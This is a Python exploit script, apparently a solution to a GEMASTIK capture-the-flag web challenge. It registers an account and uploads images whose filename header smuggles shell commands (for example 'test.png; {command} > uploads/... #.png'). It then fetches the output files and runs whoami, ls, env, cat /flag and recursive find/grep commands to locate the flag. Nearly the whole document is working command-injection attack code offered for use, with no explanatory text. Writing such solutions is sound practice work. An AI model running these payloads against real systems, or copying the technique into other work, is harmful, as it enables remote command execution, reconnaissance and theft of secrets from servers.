#!/usr/bin/env python3
import sys
import time
import uuid
import re
import requests
import base64

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <host> [port]")
    sys.exit(1)

HOST = sys.argv[1].strip()
PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 10000
SCHEME = "http"
TARGET = f"{SCHEME}://{HOST}:{PORT}"

USERNAME = "auto_" + str(uuid.uuid4())[:8]
PASSWORD = "pass" + str(uuid.uuid4())[:8]

session = requests.Session()
session.headers.update({"User-Agent": "exploit/1.1"})

DUMMY_PNG_BYTES = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"
FLAG_RE = re.compile(rb"GEMASTIK\{[^\}\r\n]{1,200}\}")


def register(u, p):
    r = session.post(
        f"{TARGET}/register",
        data={"username": u, "password": p},
        allow_redirects=True,
        timeout=10,
    )
    print(f"[+] register -> {r.status_code}")
    return r


def login(u, p):
    r = session.post(
        f"{TARGET}/login",
        data={"username": u, "password": p},
        allow_redirects=True,
        timeout=10,
    )
    print(f"[+] login -> {r.status_code}")
    return r


def create_post(
    filename_header,
    title="t",
    content="t",
    blob=DUMMY_PNG_BYTES,
    mime="image/png",
    timeout=20,
):
    files = {"image": (filename_header, blob, mime)}
    r = session.post(
        f"{TARGET}/create",
        data={"title": title, "content": content},
        files=files,
        allow_redirects=True,
        timeout=timeout,
    )
    return r


def get_home(q=None):
    params = {"q": q} if q else {}
    r = session.get(f"{TARGET}/", params=params, timeout=10)
    return r


def fetch_bytes(path):
    r = session.get(f"{TARGET}{path}", timeout=10)
    return r


def parse_first_post(html, title_contains):
    img_re = re.compile(
        r'<img\s+src=["\'](/uploads/([0-9a-f]{64}\.(?:png|jpg|jpeg|bmp)))["\']', re.I
    )
    id_re = re.compile(r'href=["\']/post/(\d+)["\']', re.I)
    title_re = re.compile(r'<a\s+href=["\']/post/\d+["\'][^>]*>\s*([^<]+)\s*</a>', re.I)

    articles = re.split(r"(?=<article\b)", html)
    for b in articles:
        if 'class="card post-card' not in b:
            continue
        m_img = img_re.search(b)
        m_id = id_re.search(b)
        m_title = title_re.search(b)
        if not (m_img and m_id):
            continue
        title_text = m_title.group(1).strip() if m_title else ""
        if title_contains and title_contains not in title_text:
            continue
        return (m_id.group(1), "/" + m_img.group(1), title_text)
    return None


def try_command_injection(target_filename, command, output_filename=None):
    """Execute command via filename injection and return the result"""
    if not output_filename:
        output_filename = target_filename

    # Try multiple upload directory paths
    upload_dirs = [
        "/app/uploads/",
        "/uploads/",
        "./uploads/",
        "/var/www/uploads/",
        "/home/app/uploads/",
        "/tmp/uploads/",
        "",
    ]

    for upload_dir in upload_dirs:
        # Try different payload formats
        payloads = [
            f"test.png; {command} > {upload_dir}{output_filename} #.png",
            f"test.png; {command} | tee {upload_dir}{output_filename} #.png",
            f"test.png; bash -c '{command} > {upload_dir}{output_filename}' #.png",
        ]

        for payload in payloads:
            print(f"    Trying: {payload[:100]}...")
            r = create_post(payload, title="cmd", content="cmd")

            # Check if we created a new file
            if output_filename != target_filename:
                time.sleep(2)
                result_r = fetch_bytes(f"/uploads/{output_filename}")
                if result_r.status_code == 200:
                    return result_r.content

            # Also check the original file
            time.sleep(2)
            result_r = fetch_bytes(f"/uploads/{target_filename}")
            if (
                result_r.status_code == 200 and len(result_r.content) > 100
            ):  # More than just PNG header
                return result_r.content

            time.sleep(1)

    return None


def main():
    print(f"[*] TARGET = {TARGET}")
    print(f"[*] registering {USERNAME}/{PASSWORD}")
    register(USERNAME, PASSWORD)
    login(USERNAME, PASSWORD)

    # Create seed post
    token = str(uuid.uuid4())[:8]
    title = f"seed-{token}"
    print(f"[*] creating seed post '{title}'")
    create_post("seed.png", title=title, content="seed")

    # Find our post
    found = None
    for i in range(10):
        time.sleep(0.5)
        r = get_home(q=token)
        if r.status_code == 200:
            found = parse_first_post(r.text, title_contains=title)
            if found:
                break

    if not found:
        print("[!] Could not find seed post")
        return

    post_id, img_path, title_text = found
    target_filename = img_path.split("/")[-1]
    print(f"[+] Found target image: {target_filename}")

    # First, verify command injection works by running a simple command
    print("[*] Verifying command injection...")

    test_commands = ["whoami", "pwd", "ls -la /", "echo 'TEST'"]

    for cmd in test_commands:
        print(f"[*] Testing: {cmd}")
        result = try_command_injection(
            target_filename, cmd, f"test_{uuid.uuid4().hex[:8]}.txt"
        )
        if result:
            print(f"[+] Command executed! Output: {result[:200]}")
            break
        time.sleep(1)

    # Now try to read the flag
    print("[*] Attempting to read flag...")

    flag_commands = [
        "cat /flag.txt",
        "cat /flag",
        "cat /app/flag.txt",
        "find / -name '*flag*' -exec cat {} \\; 2>/dev/null | head -c 1000",
        "grep -r 'GEMASTIK' / 2>/dev/null | head -c 1000",
    ]

    for cmd in flag_commands:
        print(f"[*] Trying: {cmd}")
        result = try_command_injection(
            target_filename, cmd, f"flag_{uuid.uuid4().hex[:8]}.txt"
        )
        if result:
            # Search for flag pattern
            flag_match = FLAG_RE.search(result)
            if flag_match:
                flag = flag_match.group(0).decode("ascii", "ignore")
                print(f"\n[+] FLAG FOUND: {flag}")
                return
            elif b"GEMASTIK" in result:
                print(f"[+] Found flag content: {result[:200]}")
                # Try to extract flag manually
                flag_text = result.decode("ascii", "ignore")
                if "GEMASTIK{" in flag_text:
                    start = flag_text.index("GEMASTIK{")
                    end = flag_text.index("}", start) + 1
                    print(f"\n[+] FLAG FOUND: {flag_text[start:end]}")
                    return

    # Last resort: try to list directories to understand the structure
    print("[*] Attempting to understand filesystem structure...")
    dir_commands = ["ls -la /", "ls -la /app/", "ls -la /home/", "env", "pwd"]

    for cmd in dir_commands:
        result = try_command_injection(
            target_filename, cmd, f"dir_{uuid.uuid4().hex[:8]}.txt"
        )
        if result:
            print(f"[+] {cmd}: {result[:500]}")

    print("[!] Exploit completed. If no flag found, check the responses manually.")


if __name__ == "__main__":
    main()
